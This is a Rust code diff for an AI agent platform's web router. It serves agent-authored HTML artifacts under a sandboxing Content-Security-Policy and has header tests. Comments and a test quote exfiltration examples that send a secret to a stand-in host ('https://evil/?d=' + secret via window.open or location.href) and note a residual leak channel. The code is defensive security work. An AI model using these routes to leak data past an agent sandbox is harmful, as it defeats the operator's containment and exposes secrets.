@@ -14,18 +14,76 @@ use tower_http::trace::TraceLayer;
 
 use crate::auth::AuthToken;
 use crate::handlers::{
-    a2a, agent_convo, agent_detail, agents, audit, channels, chat, config_page, connectors, costs,
-    dashboard, doctor, escalations, events, events_log, files, hal_page, identity_page, logs,
-    management, manual_page, marketplace, mcp_page, notifications, oauth, observability,
-    pipeline_ui, pipelines, plugins, prefs, profile, resources_page, roles, schedules, scratchpad,
-    secrets, tasks, teams, tools, webhooks, webhooks_page,
+    a2a, agent_convo, agent_detail, agents, artifacts, audit, channels, chat, config_page,
+    connectors, costs, dashboard, doctor, escalations, events, events_log, files, hal_page,
+    identity_page, logs, management, manual_page, marketplace, mcp_page, mentions, notifications,
+    oauth, observability, pipeline_ui, pipelines, plugins, prefs, profile, resources_page, roles,
+    schedules, scratchpad, secrets, tasks, teams, tools, webhooks, webhooks_page,
 };
 use crate::state::AppState;
 
-/// Middleware that sets security headers on every response.
-async fn add_security_headers(request: Request<axum::body::Body>, next: Next) -> Response {
-    let mut response = next.run(request).await;
-    let headers = response.headers_mut();
+/// Agent-authored HTML. `sandbox` without `allow-same-origin` puts the response in
+/// a unique opaque origin: no `document.cookie`, no parent DOM, no storage.
+/// `default-src 'none'` with no `connect-src` blocks fetch/XHR/WebSocket/beacon.
+///
+/// **NEVER add `allow-same-origin` here** — combined with `allow-scripts` it lets
+/// the document remove its own sandbox, which turns every artifact into stored XSS
+/// against an operator console that can approve escalations.
+///
+/// The load-bearing controls are the two sandbox tokens that are ABSENT:
+/// `allow-same-origin` (with `allow-scripts` it lets the document unsandbox
+/// itself) and `allow-popups` (it turns any click into
+/// `window.open('https://evil/?d=' + secret)` — an egress channel the kernel
+/// withheld, since `artifact-write` declares `network = false`).
+///
+/// `form-action 'none'` and `base-uri 'none'` are defence in depth, not the
+/// primary control: omitting `allow-forms` already blocks submission, and with
+/// `default-src 'none'` there are no subresources for a `<base>` to redirect.
+/// They are pinned anyway because `default-src` does not fall back for either
+/// (that is spec, not a browser quirk), so they keep holding if someone later
+/// adds `allow-forms` to the token list.
+///
+/// RESIDUAL, not closable by CSP while `allow-scripts` is granted: the document can
+/// still `location.href = 'https://evil/?d=' + secret` and navigate itself away.
+/// That is loud — the frame visibly leaves — but it works. Revoking `allow-scripts`
+/// is the only complete fix and would reduce artifacts to static posters.
+pub(crate) const ARTIFACT_SANDBOX_CSP: &str = "sandbox allow-scripts; \
+     default-src 'none'; \
+     base-uri 'none'; \
+     form-action 'none'; \
+     img-src data: blob:; \
+     style-src 'unsafe-inline'; \
+     script-src 'unsafe-inline'; \
+     font-src data:; \
+     frame-ancestors 'self'";
+
+/// Matches only `GET /artifacts/{id}/raw`. Ids are UUIDs and the route pattern is
+/// fixed, so no title or user input can steer another response into this policy.
+fn is_artifact_raw(path: &str) -> bool {
+    path.starts_with("/artifacts/") && path.ends_with("/raw")
+}
+
+/// Sandbox policy for the raw artifact route. `frame-ancestors 'self'` governs
+/// framing instead of `X-Frame-Options: DENY`, which would block the viewer's own
+/// iframe — hence the explicit `remove`.
+fn apply_artifact_headers(headers: &mut axum::http::HeaderMap) {
+    headers.insert(
+        axum::http::HeaderName::from_static("content-security-policy"),
+        HeaderValue::from_static(ARTIFACT_SANDBOX_CSP),
+    );
+    headers.remove(axum::http::HeaderName::from_static("x-frame-options"));
+    headers.insert(
+        axum::http::HeaderName::from_static("x-content-type-options"),
+        HeaderValue::from_static("nosniff"),
+    );
+    headers.insert(
+        axum::http::HeaderName::from_static("referrer-policy"),
+        HeaderValue::from_static("no-referrer"),
+    );
+}
+
+/// The app policy every other response carries.
+fn apply_app_headers(headers: &mut axum::http::HeaderMap) {
     headers.insert(
         axum::http::HeaderName::from_static("content-security-policy"),
         HeaderValue::from_static(
@@ -48,6 +106,23 @@ async fn add_security_headers(request: Request<axum::body::Body>, next: Next) ->
         axum::http::HeaderName::from_static("x-content-type-options"),
         HeaderValue::from_static("nosniff"),
     );
+}
+
+/// Middleware that sets security headers on every response.
+///
+/// The path is inspected **before** `next.run()` because these `insert` calls
+/// overwrite: left unbranched they would replace the artifact sandbox policy with
+/// the app policy and stamp `X-Frame-Options: DENY`, simultaneously breaking the
+/// viewer iframe and removing the isolation.
+async fn add_security_headers(request: Request<axum::body::Body>, next: Next) -> Response {
+    let raw_artifact = is_artifact_raw(request.uri().path());
+    let mut response = next.run(request).await;
+    let headers = response.headers_mut();
+    if raw_artifact {
+        apply_artifact_headers(headers);
+    } else {
+        apply_app_headers(headers);
+    }
     response
 }
 
@@ -307,6 +382,20 @@ pub fn build_router(
                 .layer(axum::extract::DefaultBodyLimit::max(101 * 1024 * 1024)),
         )
         .route("/api/files/search", axum::routing::get(files::search_api))
+        // Agent-generated artifacts. `/raw` is the only route serving agent-authored
+        // text/html — see ARTIFACT_SANDBOX_CSP. Both stay inside the auth-guarded
+        // router; neither may be added to the require_auth bypass list.
+        .route("/artifacts", axum::routing::get(artifacts::list))
+        .route("/artifacts/{id}", axum::routing::get(artifacts::view))
+        .route("/artifacts/{id}/raw", axum::routing::get(artifacts::raw))
+        .route(
+            "/artifacts/{id}/delete",
+            axum::routing::post(artifacts::delete),
+        )
+        .route(
+            "/api/mentions/search",
+            axum::routing::get(mentions::search_api),
+        )
         // Chat (session-based, separate from the task system)
         .route("/chat", axum::routing::get(chat::list))
         .route("/chat/new", axum::routing::post(chat::new_session))
@@ -503,8 +592,9 @@ pub fn build_router(
         )
         .with_state(state.clone())
         // Execution order (Axum layers run outermost-first on requests):
-        // GovernorLayer → CorsLayer → TraceLayer → CompressionLayer → add_security_headers
-        //   → Extension(auth_token) → require_auth → csrf_middleware → handler
+        // add_security_headers → GovernorLayer → CorsLayer → TraceLayer
+        //   → CompressionLayer → Extension(auth_token) → require_auth
+        //   → csrf_middleware → handler
         // CSRF middleware runs after auth, so only authenticated sessions reach it.
         .layer(axum::middleware::from_fn_with_state(
             state.clone(),
@@ -521,13 +611,111 @@ pub fn build_router(
         // bypass auth/CSRF but still get security headers, compression, and rate limiting.
         .merge(webhook_routes)
         .merge(telegram_webhook_routes)
-        // Security headers on all responses.
-        .layer(axum::middleware::from_fn(add_security_headers))
         .layer(CompressionLayer::new().compress_when(
             DefaultPredicate::new().and(NotForContentType::new("text/event-stream")),
         ))
         .layer(TraceLayer::new_for_http())
         .layer(cors)
-        // Rate limiting outermost — applied first on every incoming request.
-        .layer(GovernorLayer::new(governor_conf)))
+        // Rate limiting — applied first on every incoming request.
+        .layer(GovernorLayer::new(governor_conf))
+        // Security headers OUTERMOST so they also land on responses that
+        // short-circuit before the router: GovernorLayer's 429s, and any future
+        // outer layer that returns early. Nothing inside can strip them, and the
+        // artifact branch still reads the request path, which is unchanged here.
+        .layer(axum::middleware::from_fn(add_security_headers)))
+}
+
+/// Header-policy tests.
+///
+/// `AppState` requires a booted `Kernel`, and this crate has no integration
+/// harness that builds the router with an auth cookie, so these exercise the
+/// middleware's header helpers directly — the same functions
+/// `add_security_headers` calls, with the same branch condition.
+#[cfg(test)]
+mod security_header_tests {
+    use super::{apply_app_headers, apply_artifact_headers, is_artifact_raw};
+    use axum::http::HeaderMap;
+
+    fn headers_for(path: &str) -> HeaderMap {
+        let mut h = HeaderMap::new();
+        // Simulate a handler that already set XFO, to prove the raw branch removes it.
+        h.insert("x-frame-options", "DENY".parse().expect("static value"));
+        if is_artifact_raw(path) {
+            apply_artifact_headers(&mut h);
+        } else {
+            apply_app_headers(&mut h);
+        }
+        h
+    }
+
+    fn csp(h: &HeaderMap) -> String {
+        h.get("content-security-policy")
+            .and_then(|v| v.to_str().ok())
+            .unwrap_or_default()
+            .to_string()
+    }
+
+    #[test]
+    fn artifact_raw_path_matching() {
+        assert!(is_artifact_raw(
+            "/artifacts/6f1c1f7e-0000-0000-0000-000000000000/raw"
+        ));
+        assert!(!is_artifact_raw(
+            "/artifacts/6f1c1f7e-0000-0000-0000-000000000000"
+        ));
+        assert!(!is_artifact_raw("/artifacts"));
+        assert!(!is_artifact_raw("/files/abc/raw"));
+    }
+
+    #[test]
+    fn raw_has_sandbox_csp() {
+        let csp = csp(&headers_for("/artifacts/abc/raw"));
+        assert!(csp.contains("sandbox allow-scripts"), "got: {csp}");
+        // With allow-scripts this would let the document unsandbox itself.
+        assert!(!csp.contains("allow-same-origin"), "got: {csp}");
+        assert!(csp.contains("default-src 'none'"), "got: {csp}");
+        assert!(!csp.contains("connect-src"), "no fetch/XHR channel: {csp}");
+        // `default-src` does NOT cover these two — that is spec, not a quirk.
+        // Without them an agent with `network = false` can still exfiltrate by
+        // auto-submitting a cross-origin form.
+        assert!(csp.contains("form-action 'none'"), "got: {csp}");
+        assert!(csp.contains("base-uri 'none'"), "got: {csp}");
+        // window.open('https://evil/?d='+secret) on any click.
+        assert!(!csp.contains("allow-popups"), "got: {csp}");
+    }
+
+    #[test]
+    fn raw_has_no_x_frame_options() {
+        let h = headers_for("/artifacts/abc/raw");
+        assert!(
+            h.get("x-frame-options").is_none(),
+            "XFO would block the viewer iframe"
+        );
+        assert!(csp(&h).contains("frame-ancestors 'self'"));
+        assert_eq!(
+            h.get("x-content-type-options")
+                .and_then(|v| v.to_str().ok()),
+            Some("nosniff")
+        );
+        assert_eq!(
+            h.get("referrer-policy").and_then(|v| v.to_str().ok()),
+            Some("no-referrer")
+        );
+    }
+
+    #[test]
+    fn viewer_keeps_app_csp() {
+        for path in ["/artifacts/abc", "/artifacts", "/files"] {
+            let h = headers_for(path);
+            assert_eq!(
+                h.get("x-frame-options").and_then(|v| v.to_str().ok()),
+                Some("DENY"),
+                "{path} must keep XFO"
+            );
+            let csp = csp(&h);
+            assert!(csp.contains("default-src 'self'"), "{path}: {csp}");
+            assert!(csp.contains("frame-ancestors 'none'"), "{path}: {csp}");
+            assert!(!csp.contains("sandbox"), "{path} must not relax: {csp}");
+        }
+    }
 }
